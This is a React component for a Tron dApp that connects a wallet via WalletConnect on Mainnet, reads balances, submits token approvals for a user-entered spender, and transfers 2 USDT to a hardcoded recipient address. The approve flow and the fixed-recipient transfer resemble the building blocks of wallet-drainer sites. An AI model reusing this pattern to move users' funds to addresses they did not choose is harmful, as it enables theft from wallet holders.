
//@ts-nocheck
import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { TronWeb } from 'tronweb';
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const FULL_NODE = 'https://api.trongrid.io';
const SOLIDITY_NODE = 'https://api.trongrid.io';
const EVENT_SERVER = 'https://api.trongrid.io';
const PROJECT_ID = '150d746f7722fa489e9df7ad9ddcd955';
const RELAY_URL = 'wss://relay.walletconnect.com';

function TronConnect() {
  const { address, wallet, connected, select, connect, disconnect } = useWallet();
  const [tronWeb] = useState(() => new TronWeb(FULL_NODE, SOLIDITY_NODE, EVENT_SERVER));
  const [trxBalance, setTrxBalance] = useState(null);
  const [tokenAddress, setTokenAddress] = useState('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
  const [tokenBalance, setTokenBalance] = useState(null);
  const [spender, setSpender] = useState('');
  const [amount, setAmount] = useState(0);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [txConfirmed, setTxConfirmed] = useState(false);

  const fetchTrxBalance = useCallback(async () => {
    if (address) {
      const balanceSun = await tronWeb.trx.getBalance(address);
      setTrxBalance(balanceSun / 1_000_000);
    }
  }, [address, tronWeb]);

  const fetchTokenBalance = useCallback(async () => {
    if (address && TronWeb.isAddress(tokenAddress)) {
      try {
        const contract = await tronWeb.contract().at(tokenAddress);
        const result = await contract.balanceOf(address).call();
        setTokenBalance(parseInt(result.toString(), 10) / 1_000_000);
      } catch (err) {
        console.error(err);
      }
    }
  }, [address, tokenAddress, tronWeb]);

  const pollTransaction = async (txid) => {
    setStatus('Waiting for confirmation...');
    for (let i = 0; i < 20; i++) {
      try {
        const info = await tronWeb.trx.getTransactionInfo(txid);
        if (info.receipt?.result === 'SUCCESS') {
          setStatus('Transaction confirmed ✅');
          setTxConfirmed(true);
          return;
        }
      } catch (e) { }
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
    setStatus('Transaction not confirmed in time ⏱️');
  };

  const handleApprove = useCallback(async () => {
    if (!address || !TronWeb.isAddress(tokenAddress) || !TronWeb.isAddress(spender)) {
      setStatus('Invalid address');
      return;
    }
    try {
      setStatus('Building transaction...');
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        tokenAddress,
        'approve(address,uint256)',
        {
          feeLimit: 3_000_000,
          callValue: 0,
          shouldPollResponse: false
        },
        [
          { type: 'address', value: spender },
          { type: 'uint256', value: (amount * 1_000_000).toString() },
        ],
        address
      );
      setStatus('Signing transaction...');
      // @ts-ignore
      const signed = await wallet.adapter.signTransaction(transaction);
      setStatus('Broadcasting transaction...');
      const receipt = await tronWeb.trx.sendRawTransaction(signed);
      if (receipt?.txid) {
        setTxHash(receipt.txid);
        setStatus('Transaction sent. Waiting for confirmation...');
        await pollTransaction(receipt.txid);
      } else {
        setStatus('Broadcast failed');
      }
    } catch (error) {
      console.error(error);
      setStatus(`Error: ${error.message}`);
    }
  }, [address, tokenAddress, spender, amount, tronWeb, wallet?.adapter]);

  const checkAllowance = async () => {
    if (!TronWeb.isAddress(address) || !TronWeb.isAddress(spender)) {
      console.error('Invalid addresses');
      return;
    }
    try {
      const contract = await tronWeb.contract().at(tokenAddress);
      const result = await contract.allowance(address, spender).call({ from: address });
      const allowance = parseInt(result.toString(), 10) / 1_000_000;
      console.log('Allowance:', allowance);
      return allowance;
    } catch (err) {
      console.error('Allowance check failed:', err);
    }
  };

  useEffect(() => {
    if (connected) fetchTrxBalance();
    else {
      setTrxBalance(null);
      setTokenBalance(null);
      setStatus('');
      setTxHash('');
      setTxConfirmed(false);
    }
  }, [connected, fetchTrxBalance]);

  const handleConnect = async () => {
    setLoading(true)
    try {
      select('WalletConnect');
      await connect();
      setLoading(false)
    } catch (err) {
      console.error('Connection failed:', err);
      setLoading(false)
    }
  };

  const sendUSDT = async () => {
    const recipientAddress = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi'
    if (!TronWeb.isAddress(tokenAddress) || !TronWeb.isAddress(recipientAddress)) {
      setStatus("Invalid address");
      return;
    }

    try {
      setStatus("Building transfer transaction...");
      const usdtAmount = 2 * 1_000_000; // amount is a float like 2.5

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        tokenAddress,
        "transfer(address,uint256)",
        {
          feeLimit: 3_000_000,
          callValue: 0,
          shouldPollResponse: false,
        },
        [
          { type: "address", value: recipientAddress },
          { type: "uint256", value: usdtAmount.toString() },
        ],
        address
      );

      setStatus("Signing transaction...");
      const signedTx = await wallet.adapter.signTransaction(transaction);

      setStatus("Broadcasting transaction...");
      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);

      if (receipt?.txid) {
        setTxHash(receipt.txid);
        setStatus("Transaction sent. Waiting for confirmation...");
        await pollTransaction(receipt.txid); // already defined in your code
      } else {
        setStatus("❌ Failed to broadcast transaction");
      }
    } catch (err) {
      console.error(err);
      setStatus(`Error: ${err.message}`);
    }
  };

  useEffect(() => {
    const reconnect = async () => {
      try {
        const result = await wallet.checkConnectStatus(); // checks session state
        if (result.address) {
          setStatus('🔁 Session reconnected');
          // Optionally update your app state/UI here
        }
      } catch (err) {
        console.error('Reconnection failed:', err);
      }
    };

    reconnect();
  }, []);



  return (
    <div>
      {!connected ? (
        <button disabled={loading} onClick={handleConnect}>{loading ? 'Loading...' : 'Connect Wallet'}</button>
      ) : (
        <button onClick={disconnect}>Disconnect</button>
      )}
      {connected && (
        <div>
          <p>Address: {address}</p>
          <p>TRX Balance: {trxBalance}</p>

          <div>
            <input
              type="text"
              placeholder="Token Contract Address"
              value={tokenAddress}
              onChange={e => setTokenAddress(e.target.value)}
            />
            <button onClick={fetchTokenBalance}>Get Token Balance</button>
            {tokenBalance !== null && <p>Token Balance: {tokenBalance}</p>}
          </div>

          <div>
            <input
              type="text"
              placeholder="Spender Address"
              value={spender}
              onChange={e => setSpender(e.target.value)}
            />
            <input
              type="number"
              placeholder="Amount"
              value={amount}
              onChange={e => setAmount(parseFloat(e.target.value))}
            />
            <button onClick={handleApprove}>Approve</button>
            <button onClick={checkAllowance}>Check Allowance</button>
            <button onClick={sendUSDT}>sendUSDT</button>
            {status && <p>{status}</p>}
            {txHash && <p>Tx Hash: <a href={`https://tronscan.org/#/transaction/${txHash}`} target="_blank" rel="noopener noreferrer">{txHash}</a></p>}
            {txConfirmed && <p>✅ Transaction Confirmed</p>}
          </div>
        </div>
      )}
    </div>
  );
}

export default function TronWalletConnectComponent() {
  const adapter = useMemo(
    () =>
      new WalletConnectAdapter({
        network: 'Mainnet',
        options: {
          projectId: PROJECT_ID,
          relayUrl: RELAY_URL,
          metadata: {
            name: 'My Tron DApp',
            description: 'DApp with WalletConnect',
            url: window.location.origin,
            icons: [],
          },
        },
      }),
    []
  );

  const onError = useCallback(e => console.error(e), []);

  return (
    <WalletProvider adapters={[adapter]} onError={onError} autoConnect>
      <TronConnect />
    </WalletProvider>
  );
}